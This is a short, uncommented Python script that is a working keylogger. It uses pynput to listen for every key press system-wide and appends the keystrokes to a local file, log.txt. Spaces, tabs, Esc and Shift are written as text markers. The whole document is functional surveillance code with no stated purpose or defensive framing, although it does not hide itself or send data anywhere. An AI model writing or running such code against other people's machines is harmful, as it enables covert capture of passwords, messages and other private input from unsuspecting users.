from pynput import keyboard

maxChar = 5
maxSpaces = 10
nspaces = 0
nchar = 0
text = ""


def switch(var):
    if var == keyboard.Key.space:
        global nspaces
        global maxSpaces
        nspaces = nspaces + 1
        if maxSpaces > nspaces:
            return " "
        else:
            nspaces = 0
            return "\n"
    if var == keyboard.Key.tab:
        return "    "
    if var == keyboard.Key.esc:
        return "[ESC]"
    if var == keyboard.Key.shift:
        return "[SHIFT]"
    if var == keyboard.Key.enter:
        return "\n"


def on_press(key):

    global nchar
    global text
    global maxChar

    specialchar = ""
    special = False

    if key == keyboard.Key.esc or \
       key == keyboard.Key.space or \
       key == keyboard.Key.tab or \
       key == keyboard.Key.shift:
        special = True
        specialchar = switch(key)
    else:
        special = False

    nchar = nchar + 1

    try:
        if special:
            text = text + specialchar
        else:
            text = text + key.char
    except:
        text = text + "[SPECIAL_CHAR]"

    with open('log.txt', 'a') as f:
        f.write(text)
        text = ""
        f.close()

    if nchar == maxChar:
        nchar = 0

listener = keyboard.Listener(on_press=on_press)
listener.start()  # start to listen on a separate thread
listener.join()  # remove if main thread is polling self.keys
